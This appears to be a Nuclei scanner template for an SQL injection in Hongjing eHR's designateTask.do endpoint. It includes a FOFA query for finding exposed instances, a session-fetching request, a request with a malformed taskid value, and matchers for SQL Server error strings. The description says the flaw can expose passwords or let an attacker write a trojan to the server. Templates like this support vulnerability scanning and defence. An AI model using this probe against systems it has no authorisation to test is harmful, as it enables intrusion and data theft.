id: hongjingeHR-designateTask_do-sql

info:
  tags: hongjingeHR-designateTask_do-sql
  name: 宏景eHR designateTask.do SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="HJSOFT-HCM"
    宏景eHR designateTask.do 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        GET /module/system/qrcard/mobilewrite/qrcardmain.jsp HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        part: header
        name: JSESSIONID
        group: 1
        regex:
          - 'JSESSIONID=(.*?);'
        internal: true
  - raw:
      - |
        GET /performance/objectiveManage/designateTask.do?b_save=&taskid=-1-user HTTP/1.1
        Host: {{Hostname}}
        Cookie: {{JSESSIONID}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '转换成数据类型 int 时失败'
          - '在将 nvarchar 值'
        condition: and
      - type: status
        status: 
          - 200
